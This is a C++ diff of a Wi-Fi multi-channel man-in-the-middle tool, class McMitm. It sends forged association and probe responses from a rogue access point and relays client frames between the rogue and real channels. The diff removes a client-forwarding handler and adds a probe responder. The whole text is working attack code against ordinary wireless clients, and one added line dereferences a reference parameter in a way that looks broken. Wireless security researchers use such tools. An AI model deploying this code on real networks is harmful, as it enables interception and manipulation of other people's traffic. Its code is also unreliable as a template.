@@ -35,15 +35,15 @@ bool McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) const{
 bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, Dot11 &dot11) const{
     if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()){
         Dot11AssocResponse resp;
-        resp.addr1(addr2);      // target sta
-        resp.addr2(ap_mac);     // rogue AP
+        resp.addr1(addr2);  // target sta
+        resp.addr2(ap_mac); // rogue AP
         resp.addr3(ap_mac);
         resp.status_code(0); //success
         resp.capabilities() = assoc->capabilities();
         resp.aid(1);
 
         // Supported Rates IE
-        Dot11ManagementFrame::rates_type rates = {
+        const Dot11ManagementFrame::rates_type rates = {
             static_cast<Dot11ManagementFrame::rates_type::value_type>(82),  // 1 Mbps (basic)
             static_cast<Dot11ManagementFrame::rates_type::value_type>(84),  // 2 Mbps (basic)
             static_cast<Dot11ManagementFrame::rates_type::value_type>(139), // 5.5 Mbps (basic)
@@ -56,43 +56,21 @@ bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, Dot11 &do
         resp.supported_rates(rates);
         sock_rogue->send(resp, netconfig.rogue_channel);
         log(LogLevel::DEBUG, "Rogue channel: sent Assoc response to {}", addr2.to_string());
-        sock_real->send(pdu, netconfig.real_channel);
+        sock_real->send(*pdu, netconfig.real_channel);
         return true;
     }
     return false;
 }
 
-void McMitm::handle_from_client_rogue(const unique_ptr<PDU> &pdu, Dot11 &dot11, const HWAddress<6> &addr2) {
-    ClientState *client = nullptr;
-    bool will_forward = false;
-
-    if(clients.contains(addr2.to_string())){
-        client = clients.at(addr2.to_string()).get();
-        will_forward = client->should_forward(*pdu);
-        if(dot11.find_pdu<Dot11Authentication>() || dot11.find_pdu<Dot11AssocRequest>() ||
-           client->state <= ClientState::Connecting){
-            print_rx(LogLevel::INFO, "Rogue channel", dot11, " -- MitM'ing");
-            client->mark_got_mitm();
-        } else{
-            client->last_rogue = display_client_traffic(*pdu, "Rogue channel", client->last_rogue, " -- MitM'ing");
-        }
-    } else if(dot11.find_pdu<Dot11Authentication>() || dot11.find_pdu<Dot11AssocRequest>() ||
-              dot11.type() == Dot11::DATA){
-        print_rx(LogLevel::INFO, "Rogue channel", dot11, " -- MitM'ing");
-        auto new_client = ClientState(addr2.to_string());
-        new_client.mark_got_mitm();
-        add_client(new_client);
-        client = clients.at(addr2.to_string()).get();
-        will_forward = true;
-    } else if(addr2 == client_mac){
-        last_print_rogue_chan = display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan);
+bool McMitm::handle_probe_request(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) const{
+    if(dot11.find_pdu<Dot11ProbeRequest>()){
+        if(ap_mac != dot11.addr1()) return true;
+        probe_resp->addr1(addr2);
+        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
+        display_client_traffic(*pdu, "Rogue channel", " -- Replied");
+        return true;
     }
-
-    if(client && will_forward){
-        if(power_mgmt(dot11) && client->state < ClientState::Attack_Done)
-            log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel.", addr2.to_string());
-        sock_real->send(*pdu, netconfig.real_channel);
-    }
+    return false;
 }
 
 void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
@@ -144,8 +122,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
         if(const auto *b = dot11->find_pdu<Dot11Beacon>()){
             const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
             if(ch_ie && ch_ie->data_size() >= 1 && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
-                last_rogue_beacon =
-                        steady_clock::now();
+                last_rogue_beacon = steady_clock::now();
         }
 
         if(dot11->addr1() == client_mac){
@@ -195,7 +172,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
             sock_real->send(*pdu, netconfig.real_channel);
         }
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
-        last_print_rogue_chan = display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan);
+        display_client_traffic(*pdu, "Rogue channel", "_");
     }
 }
 
